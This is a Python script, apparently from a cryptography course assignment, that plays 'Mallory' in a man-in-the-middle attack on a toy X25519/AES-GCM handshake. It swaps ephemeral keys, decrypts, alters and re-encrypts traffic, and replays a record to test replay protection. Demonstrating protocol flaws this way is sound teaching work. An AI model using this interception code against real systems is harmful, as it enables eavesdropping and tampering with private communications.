import sys, os; sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PublicKey
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from Load_keys import *

from transport import accept_peer, send_message, receive_message, connect_to_peer
import sys
import json
import struct
import hashlib

isAuthEnabled = True
MALLORY_PORT = 5005
BOB_PORT = 5000
PROTOCOL_ID = "CS6530-A2-v1"
ALICE_ID = "CS26D400"
BOB_ID = "CS26M016"

def build_nonce(counter):
    """Build 96-bit nonce: 0x00000000 || uint64_be(counter)."""
    return b'\x00\x00\x00\x00' + struct.pack("!Q", counter)

def build_aad(sender_id, receiver_id, alice_sid, bob_sid, counter):
    """Build AAD = Sender_ID || Receiver_ID || Alice_SID || Bob_SID || Message_Counter."""
    return (sender_id + receiver_id + alice_sid + bob_sid +
            struct.pack("!Q", counter))

def InterceptHandshake(isAuthEnabled, sockAlice, sockBob):
    """
    Mallory intercepts the handshake, substituting ephemeral public keys
    to establish separate shared secrets with Alice and Bob.
    """

    malloryAliceEphPrivateKey = X25519PrivateKey.generate()
    malloryAliceEphPublicKey = malloryAliceEphPrivateKey.public_key()
    malloryAliceEphemeralPK = malloryAliceEphPublicKey.public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw)

    malloryBobEphPrivateKey = X25519PrivateKey.generate()
    malloryBobEphPublicKey = malloryBobEphPrivateKey.public_key()
    malloryBobEphemeralPK = malloryBobEphPublicKey.public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw)

    message = receive_message(sockAlice)
    M1 = json.loads(message.decode())
    aliceEphemeralPK = M1["Alice_Ephemeral_PK"]
    print("LOG: [MALLORY] M1 received from Alice")
    print(f"LOG: [MALLORY]   Alice_SID       = {M1['Alice_SID']}")
    print(f"LOG: [MALLORY]   Alice_Eph_PK    = {aliceEphemeralPK[:16]}...")

    M1_modified = dict(M1)
    M1_modified["Alice_Ephemeral_PK"] = malloryBobEphemeralPK.hex()
    send_message(sockBob, json.dumps(M1_modified).encode())
    print("LOG: [MALLORY] M1 forwarded to Bob (Alice_Eph_PK SUBSTITUTED)")

    message = receive_message(sockBob)
    M2 = json.loads(message.decode())
    bobEphemeralPK = M2["Bob_Ephemeral_PK"]
    print("LOG: [MALLORY] M2 received from Bob")
    print(f"LOG: [MALLORY]   Bob_SID         = {M2['Bob_SID']}")
    print(f"LOG: [MALLORY]   Bob_Eph_PK      = {bobEphemeralPK[:16]}...")

    M2_modified = dict(M2)
    M2_modified["Bob_Ephemeral_PK"] = malloryAliceEphemeralPK.hex()
    send_message(sockAlice, json.dumps(M2_modified).encode())
    print("LOG: [MALLORY] M2 forwarded to Alice (Bob_Eph_PK SUBSTITUTED)")

    if isAuthEnabled:

        M3 = receive_message(sockAlice)
        print("LOG: [MALLORY] M3 received from Alice (signature pass-through)")
        send_message(sockBob, M3)
        print("LOG: [MALLORY] M3 forwarded to Bob")

        M4 = receive_message(sockBob)
        print("LOG: [MALLORY] M4 received from Bob (signature pass-through)")
        send_message(sockAlice, M4)
        print("LOG: [MALLORY] M4 forwarded to Alice")

    sharedSecretWithAlice = ComputeSharedSecret(
        malloryAliceEphPrivateKey, bytes.fromhex(aliceEphemeralPK))

    sharedSecretWithBob = ComputeSharedSecret(
        malloryBobEphPrivateKey, bytes.fromhex(bobEphemeralPK))

    print(f"\nLOG: [MALLORY] Shared Secret with Alice: {sharedSecretWithAlice.hex()}")
    print(f"LOG: [MALLORY] Shared Secret with Bob:   {sharedSecretWithBob.hex()}\n")

    alice_sid = bytes.fromhex(M1["Alice_SID"])
    bob_sid = bytes.fromhex(M2["Bob_SID"])

    transcript_alice = (
        PROTOCOL_ID.encode() +
        ALICE_ID.encode() +
        BOB_ID.encode() +
        alice_sid +
        bob_sid +
        bytes.fromhex(aliceEphemeralPK) +
        malloryAliceEphemeralPK
    )
    transcriptHash_alice = hashlib.sha256(transcript_alice).digest()
    kAliceToBob_alice, kBobToAlice_alice = DeriveTwoDirectionalTrafficKeys(
        ikm=sharedSecretWithAlice, salt=transcriptHash_alice)

    print(f"LOG: [MALLORY] K_Alice_to_Mallory (Alice->Bob key from Alice's view): {kAliceToBob_alice.hex()}")
    print(f"LOG: [MALLORY] K_Mallory_to_Alice (Bob->Alice key from Alice's view): {kBobToAlice_alice.hex()}")

    transcript_bob = (
        PROTOCOL_ID.encode() +
        ALICE_ID.encode() +
        BOB_ID.encode() +
        alice_sid +
        bob_sid +
        malloryBobEphemeralPK +
        bytes.fromhex(bobEphemeralPK)
    )
    transcriptHash_bob = hashlib.sha256(transcript_bob).digest()
    kAliceToBob_bob, kBobToAlice_bob = DeriveTwoDirectionalTrafficKeys(
        ikm=sharedSecretWithBob, salt=transcriptHash_bob)

    print(f"LOG: [MALLORY] K_Mallory_to_Bob (Alice->Bob key from Bob's view):     {kAliceToBob_bob.hex()}")
    print(f"LOG: [MALLORY] K_Bob_to_Mallory (Bob->Alice key from Bob's view):     {kBobToAlice_bob.hex()}")

    return {

        "K_recv_from_Alice": kAliceToBob_alice,
        "K_send_to_Alice": kBobToAlice_alice,

        "K_recv_from_Bob": kBobToAlice_bob,
        "K_send_to_Bob": kAliceToBob_bob,
        "Alice_SID": alice_sid,
        "Bob_SID": bob_sid,
    }

def mitm_decrypt(key, ciphertext_hex, counter, sender_is_alice, alice_sid, bob_sid):
    """Decrypt an AEAD record that Mallory intercepted."""
    aesgcm = AESGCM(key)
    nonce = build_nonce(counter)
    if sender_is_alice:
        aad = build_aad(ALICE_ID.encode(), BOB_ID.encode(), alice_sid, bob_sid, counter)
    else:
        aad = build_aad(BOB_ID.encode(), ALICE_ID.encode(), alice_sid, bob_sid, counter)
    plaintext = aesgcm.decrypt(nonce, bytes.fromhex(ciphertext_hex), aad)
    return plaintext

def mitm_encrypt(key, plaintext, counter, sender_is_alice, alice_sid, bob_sid):
    """Encrypt an AEAD record for Mallory to forward."""
    aesgcm = AESGCM(key)
    nonce = build_nonce(counter)

    if sender_is_alice:
        aad = build_aad(ALICE_ID.encode(), BOB_ID.encode(), alice_sid, bob_sid, counter)
    else:
        aad = build_aad(BOB_ID.encode(), ALICE_ID.encode(), alice_sid, bob_sid, counter)
    ct = aesgcm.encrypt(nonce, plaintext, aad)
    return ct

def InterceptApplicationData(sockAlice, sockBob, keys):
    """
    Intercept, decrypt, optionally modify, and re-encrypt application data.
    Demonstrates TR-2 (MITM) and TR-3 (replay).
    """
    alice_sid = keys["Alice_SID"]
    bob_sid = keys["Bob_SID"]
    captured_records = []

    print("\n" + "=" * 60)
    print("LOG: [MALLORY] === INTERCEPTING APPLICATION DATA ===")
    print("=" * 60 + "\n")

    for i in range(3):
        raw = receive_message(sockAlice)
        record = json.loads(raw.decode())
        counter = record["counter"]
        ct_hex = record["ciphertext"]

        print(f"LOG: [MALLORY] Captured Alice→Bob record #{counter}")

        plaintext = mitm_decrypt(
            keys["K_recv_from_Alice"], ct_hex, counter,
            sender_is_alice=True, alice_sid=alice_sid, bob_sid=bob_sid)
        print(f"LOG: [MALLORY]   DECRYPTED: {plaintext.decode()}")

        captured_records.append(raw)

        if counter == 1:
            modified_text = b"MALLORY MODIFIED THIS MESSAGE!"
            print(f"LOG: [MALLORY]   MODIFYING message 1: '{plaintext.decode()}' -> '{modified_text.decode()}'")
            new_ct = mitm_encrypt(
                keys["K_send_to_Bob"], modified_text, counter,
                sender_is_alice=True, alice_sid=alice_sid, bob_sid=bob_sid)
            new_record = json.dumps({"counter": counter, "ciphertext": new_ct.hex()})
            send_message(sockBob, new_record.encode())
        else:

            new_ct = mitm_encrypt(
                keys["K_send_to_Bob"], plaintext, counter,
                sender_is_alice=True, alice_sid=alice_sid, bob_sid=bob_sid)
            new_record = json.dumps({"counter": counter, "ciphertext": new_ct.hex()})
            send_message(sockBob, new_record.encode())

        print(f"LOG: [MALLORY]   Re-encrypted and forwarded to Bob")

    for i in range(3):
        raw = receive_message(sockBob)
        record = json.loads(raw.decode())
        counter = record["counter"]
        ct_hex = record["ciphertext"]

        print(f"LOG: [MALLORY] Captured Bob→Alice record #{counter}")

        plaintext = mitm_decrypt(
            keys["K_recv_from_Bob"], ct_hex, counter,
            sender_is_alice=False, alice_sid=alice_sid, bob_sid=bob_sid)
        print(f"LOG: [MALLORY]   DECRYPTED: {plaintext.decode()}")

        new_ct = mitm_encrypt(
            keys["K_send_to_Alice"], plaintext, counter,
            sender_is_alice=False, alice_sid=alice_sid, bob_sid=bob_sid)
        new_record = json.dumps({"counter": counter, "ciphertext": new_ct.hex()})
        send_message(sockAlice, new_record.encode())
        print(f"LOG: [MALLORY]   Re-encrypted and forwarded to Alice")

    print("\n" + "=" * 60)
    print("LOG: [MALLORY] === TR-3: REPLAY ATTACK ===")
    print("=" * 60)
    print("LOG: [MALLORY] Replaying captured Alice→Bob record #0 to Bob")
    print("LOG: [MALLORY] Bob expects counter=3 next, but replay has counter=0")
    print("LOG: [MALLORY] This should be REJECTED by Bob's replay protection\n")

    try:
        send_message(sockBob, captured_records[0])
        print("LOG: [MALLORY] Replay record sent to Bob")
    except Exception as e:
        print(f"LOG: [MALLORY] Failed to send replay: {e}")

    return

if len(sys.argv) not in (3, 4):
    print("Usage: python Mallory.py <Alice-IP> <Bob-IP> [--disable-ed-auth]")
    raise SystemExit(1)

AliceIP = sys.argv[1]
BobIP = sys.argv[2]

if len(sys.argv) == 4:
    if sys.argv[3] == "--disable-ed-auth":
        isAuthEnabled = False
    else:
        print("Usage: python Mallory.py <Alice-IP> <Bob-IP> [--disable-ed-auth]")
        raise SystemExit(1)

print(f"LOG: [MALLORY] Waiting for Alice on TCP port {MALLORY_PORT}...")
if isAuthEnabled:
    print("LOG: [MALLORY] Ed25519 Authentication is ENABLED")
else:
    print("LOG: [MALLORY] Ed25519 Authentication is DISABLED")

sockAlice, peerAlice = accept_peer(MALLORY_PORT)
print(f"LOG: [MALLORY] Connected to Alice at {peerAlice}")

sockBob = connect_to_peer(BobIP, BOB_PORT)
print(f"LOG: [MALLORY] Connected to Bob at {BobIP}:{BOB_PORT}")

try:
    keys = InterceptHandshake(isAuthEnabled, sockAlice, sockBob)
except Exception as e:
    print(f"LOG: [MALLORY] Handshake intercept failed: {e}")
    sockAlice.close()
    sockBob.close()
    raise SystemExit(1)

if keys is None:
    print("LOG: [MALLORY] Handshake interception failed - no keys derived")
    sockAlice.close()
    sockBob.close()
    raise SystemExit(1)

print("\nLOG: [MALLORY] Handshake interception SUCCESSFUL")
print("LOG: [MALLORY] Mallory now has separate shared secrets with Alice and Bob\n")

try:
    InterceptApplicationData(sockAlice, sockBob, keys)
except Exception as e:
    print(f"LOG: [MALLORY] Application data interception error: {e}")

print("\nLOG: [MALLORY] Session complete")
sockAlice.close()
sockBob.close()
